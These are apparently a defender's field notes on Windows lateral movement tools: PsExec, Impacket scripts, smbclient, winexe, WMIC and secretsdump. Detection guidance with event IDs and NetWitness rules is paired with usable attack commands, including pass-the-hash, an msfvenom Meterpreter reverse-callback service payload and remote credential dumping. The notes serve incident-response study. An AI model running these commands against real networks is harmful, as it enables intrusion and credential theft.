# Field Notes - Windows Lateral Movement and Remote Credential Harvesting

> Paolo Coba | 22/09/2021

-------------------------------------------

# Resources
* [https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to)
* [https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/](https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/)
* [Lee Kirkpatrick's blogs on Lateral Movement](https://community.netwitness.com/t5/user/viewprofilepage/user-id/6034)
* [https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/#)
* [https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy]

# PsExec

## Microsoft Sysinternals Suite

Allows the execution of interactive commands over SMB using named pipes. 
* Connects to $ADMIN share
* uploads a psexesvc.exe file. 
* Uses service control manager (sc) to start the service binary.
* Creates named pipe on destination host.
* Uses pipe for I/O operations.

### Normal usage
```cmd
PsExec.exe /accepteula \\<dest> -u <domain>\<user> -p <password> command
```

### Pass the hash
```cmd
privilege::logonpasswords
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
PsExec.exe /accepteula \\<dest> command
```

### Detection

Detection on destination
* psexesvc.exe uploaded to target's $ADMIN share. Windows event log id 5145 created.
* Event log id 7045 for service creation.

Detection on source
* Registry value created when PsExec License Agreement is accepted.
* Prefetch for execution history.

## Impacket Toolsuite
Fails with interactive binaries such as powershell, vssadmin, plink etc. Uploads a service binary with an arbitrary name.

## Normal usage
```bash
python psexec.py user:password@<host> command
```

## Pass the hash
```bash
python psexec.py -hashes <hash> user@<host> command
```

## Manual PsExec behavior with sc

### Requirements
* Port 139,445 open on target machine.
* Password or NTLM hash.
* Write permissions on network share.
* Permission to create services on the remote machine: **SC_MANAGER_CREATE_SERVICE**
* Permission to start created service: **SERVICE_QUERY_STATUS + SERVICE_START**

### Steps
* Create exe as service
```bash
msfvenom -p windows\x64\meterpreter\reverse_http LHOST=<host> LPORT=<port> -f exe-service --platform windows -e x64\xor_dynamic -o meter64_service.exe
```
* Upload exe to network share on target machine (needs password)
```bash
smbclient \\<host>\\<share> -U <user> -c "put meter64_service.exe test.exe"
```
* Create service remotely with impacket's service.py
```bash
python services.py <DOMAIN>\<user>@<host> create -name <service name> -display <display name> -path "\\\\<host>\\<share\\test.exe"
```
* Start service remotely with impacket's service.py
```bash
python services.py <DOMAIN>\<user>@<host> start -name <service name>
```

### Detection
* Event log id 7045 for service creation.
* Suspicious executable in network share.

# smbexec.py

## Characteristics

Does not upload a service binary to target. Creates a service with name **BTOBTO**. This can be changed as the tool is highly customizable (either code or parameter when running). 

## Functionality:
```
%COMSPEC% /Q /c echo <command> > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
```

* %COMPSPEC%: Environment variable that points to cmd.exe
* /Q: Turns echo off.
* /c: Carries out the specified command and terminates.
* Command is echoed in a file called __output in the C$ of the local machine.
* Transfers the command in a bat file in %TEMP%/execute.bat which is then executed and deleted.
    * %TEMP%: Environment variable that points to C:\Users\<username>\AppData\Local\Temp
* 

## Usage

### Normal Usage
```bash
python smbexec.py <user>:<password>@<host>
```

### Pass the hash
```bash
python smbexec.py -hashes <hash> <user>@<host> command
```

## Detection
* Event log id 7045 for service creation

### Detection in Netwitness Packets

* Application rule for smbexec detection
```
(ioc = 'remote service control') && (analysis.service = 'windows cli admin commands') && (service = 139) && (directory = '\\C$\\','\\ADMIN$\\')
```

### Detection in Netwitness Endpoints
* Application rule for smbexec detection
```
param.dst contains '\\127.0.0.1\C$\__output'
```

* Meta to look for
 * Behaviors of Compromise:
    * services runs command shell
    * runs chained command shell

# Smbclient

## Characteristics

Tool to test connectivity to Windows shares. Can transfer, upload, backup files. Can be used with pass-the-hash.

## Normal Usage
* List shares
```bash
smbclient -L <dest> -U <user> -W <domain>
```

* Access drive
```bash
smbclient //<dest>/<share> -U <user> -W <domain>
```

## Pass the hash

```bash
smbclient //<dest>/<share> -U <user>%<hash> --pw-nt-hash
```

## Detection

# Winexe

## Characteristics

GNU/Linux based application that allows users to execute commands remotely on WindowsNT/2000/XP/2003/Vista/7/8 systems. It installs a service on the remote system, executes the command. **TODO: Determine if service is uninstalled once completed and file is deleted**.
* Connects to ADMIN$ share and uploads winexesvc.exe file.
* Uses service control manager (sc) to start the service binary (service named winexesvc).
* Creates a named pipe on the destination host and uses it for I/O operations.

## Usage
```bash
winexe -U <user>%<password> //<dest> command
```

## Detection
* Event log id 7045 for service creation. Service name winexesvc.

## Detection in NWP
* Filename metadata: Search for winexesvc.exe.
* Use analysis.service='named pipe' drill:
    * Filename metadata: svcctl. Named pipe used by Service Control Manager. Acts as RPC to control services on remote endpoints.
* Other named pipe to check for: ahexec. Used by Winexe for remote commands. Can see remote commands.
* Application rule:
```
(filename = 'ahexec','winexesvc.exe') && (service = 139)
```

## Detection in NWE
* filename.src meta: search for winexesvc.exe
* filename.dst meta: shows executables invoked.
* Application rule:
```
filename.src = 'winexesvc.exe'

(reference.id='7045') && (service.name='winexesvc')
```

# WMI

## Characteristics

Built into Windows. Allows remote access by communicating with RPC using port 135. It can be used to start a service or execute commands remotely.

## Built-In WMIC
```cmd
wmic /node:<dest> /user:<domain>\<user> /password:<password> process call create <executable>
```

## Impacket toolsuite
```bash
python wmiexec.py <user>:<password>@<dest>
python wmiexec.py -hashes <hash> <user>@<dest>
```

## Detection
* Source:
    * Event id 4648: logon with explicit credentials.
    * Event id 4688 / SysmonID 1: New process "wmic.exe" created
    * Event id 4689: Process terminated.
* Destination:
    * Local admin authentication:
        * Event IDs 4776,4672,4624 (Type 3)
    * Security 4688 / Sysmon 1: process wmiprvse.exe with child process based on executed command.

## Detection in NWP
* Indicators of Compromised meta key: look for **wmi command**
* Action meta key: executed commands
* Application rule:
```
action contains '127.0.0.1\\admin$\\__1'
```

## Detection in NWE
* Behaviors of Compromise meta key: look for **wmiprvse runs command shell**
* Application rule:
```
param.dst contains '127.0.0.1\\admin$\\__1'
```

# Secretsdump.py

## Characteristics

Script used to extract credentials and secrets from a system. Use-cases:
* Dump NTLM hash of local users (Remote SAM dump)
* Extract domain credentials via DCSync.

## Normal Usage
```bash
python secretsdump.py <domain>/<user>:<password>@<dest>
```

## Detection 1
* Tool enables **RemoteRegistry** service on remote endpoint. Stopped state by default.
* Security event log:
    * Event id 4624 (type 3): network logon and NTLM authentication package. Key length 0.
    * Event id 4672: special privileges assigned to logon. Check for **SeDebug or SeBackup** privileges.

## Detection 2
* Configure Security Access Control List: Change ACL to log access to the HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg registry value. Auditing permissions to everyone.
* Configure regisry access auditing in Local Security Policy -> Security Settings -> Advanced Audit Policy Configuration -> System Audit Policies - Local Group -> Object Access -> Audit Registry.






